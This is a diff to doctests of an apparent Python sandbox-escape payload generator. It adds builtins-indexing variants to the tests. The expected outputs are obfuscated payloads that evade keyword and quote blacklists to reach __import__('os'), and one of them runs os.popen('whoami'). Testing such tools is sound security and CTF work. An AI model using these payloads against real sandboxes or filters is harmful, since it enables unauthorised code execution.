@@ -190,8 +190,11 @@ def test_Name():
     >>> _test("by_unicode", "__import__", ["imp", "rt"], "imp|rt")
     __𝒊mpo𝒓t__
 
-    >>> _test("by_builtins", "__import__", [], "^__import__$")
+    >>> _test("by_builtins_attr", "__import__", [], "^__import__$")
     __builtins__.__import__
+
+    >>> _test("by_builtins_item", "__import__", [], "^__import__$")
+    __builtins__['__import__']
 
     >>> _test("by_builtin_func_self", "__import__", [], "^__import__$")
     id.__self__.__import__
@@ -205,8 +208,11 @@ def test_Name():
     >>> _test("by_unicode", "dict(a=__import__)", ["__i"], "__i")
     dict(a=_＿import__)
 
-    >>> _test("by_builtins", "dict(a=__import__)", [], "^__import__$")
+    >>> _test("by_builtins_attr", "dict(a=__import__)", [], "^__import__$")
     dict(a=__builtins__.__import__)
+
+    >>> _test("by_builtins_item", "dict(a=__import__)", [], "^__import__$")
+    dict(a=__builtins__['__import__'])
 
     >>> _test("by_builtin_func_self", "dict(a=__import__)", [], "^__import__$")
     dict(a=id.__self__.__import__)
@@ -347,12 +353,15 @@ def test_Combo():
     𝒊d('x')
 
     >>> # ----- Name -----
-    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_builtins_attr"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(__builtins__,(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))
 
     >>> # ----- Integrated -----
-    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_builtins_attr"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(getattr(getattr(__builtins__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)),(chr(114)+chr(101)+chr(97)+chr(100)))()
+
+    >>> maps = {"Bypass_Name": ["by_builtins_item"], "Bypass_String": ["by_char_add", "by_char"]}; _test(..., "__import__('os')", ["import", '"', "'"], r"import|'|\\\"", maps=maps)
+    __builtins__[(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))]((chr(111)+chr(115)))
 
     >>> maps = {"Bypass_Name": ["by_frame"], "Bypass_String": ["by_char_add"]}; _test(..., '__import__("os")', [], "__|＿", maps=maps)
     (i for i in ()).gi_frame.f_builtins[('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_')]('os')
